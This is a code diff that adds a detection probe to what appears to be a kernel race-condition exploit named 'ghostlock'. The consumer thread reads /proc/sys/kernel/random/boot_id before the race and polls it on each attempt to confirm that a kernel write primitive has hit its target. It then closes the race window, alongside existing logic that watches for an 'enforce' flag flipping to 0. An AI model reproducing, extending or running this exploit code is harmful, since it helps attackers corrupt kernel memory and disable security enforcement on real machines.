@@ -13,6 +13,7 @@
 #include "route/route_policy.hpp"
 #include "session/exploit_session.hpp"
 
+#include <cstring>
 #include <fcntl.h>
 #include <unistd.h>
 
@@ -104,6 +105,17 @@ namespace ghostlock::race {
         support::disable_rseq_for_thread();
         kernel::pin_to_core(static_cast<size_t>(race->consumer_cpu));
         pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
+        /* E11 probe: snapshot the boot_id before any consume so the poll has a
+         * baseline to compare against. */
+        if (race->probe_baseline[0] == '\0') {
+            int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
+            if (fd >= 0) {
+                ssize_t got = read(fd, race->probe_baseline,
+                                   sizeof(race->probe_baseline) - 1);
+                (void) got;
+                close(fd);
+            }
+        }
         int32_t seen = 0;
         while (!race->consumer_stop.load()) {
             int32_t seq = race->consumer_go.load();
@@ -179,6 +191,31 @@ namespace ghostlock::race {
                         if (enforce_state == '0') {
                             pr_info("consumer: enforce flipped to 0 after %d calls; closing window\n",
                                     calls_this_seq);
+                            race->consumer_go.store(0);
+                            break;
+                        }
+                    } else if (race->request) {
+                        /* E11 probe: with GHOSTLOCK_W1_TARGET the write lands on
+                         * the sysctl boot_id data; the UUID string is readable
+                         * from /proc, making the primitive userspace-visible.
+                         * Poll it each call and freeze the window on change. */
+                        static const char *kProbePath =
+                            "/proc/sys/kernel/random/boot_id";
+                        char probe_now[40] = {0};
+                        int probe_fd = open(kProbePath, O_RDONLY);
+                        if (probe_fd >= 0) {
+                            ssize_t got = read(probe_fd, probe_now,
+                                               sizeof(probe_now) - 1);
+                            (void) got;
+                            close(probe_fd);
+                        }
+                        if (probe_now[0] != '\0' &&
+                            std::strcmp(probe_now,
+                                        race->probe_baseline) != 0) {
+                            pr_info("consumer: PROBE FLIPPED after %d calls: "
+                                    "%s -> %s; closing window\n",
+                                    calls_this_seq, race->probe_baseline,
+                                    probe_now);
                             race->consumer_go.store(0);
                             break;
                         }
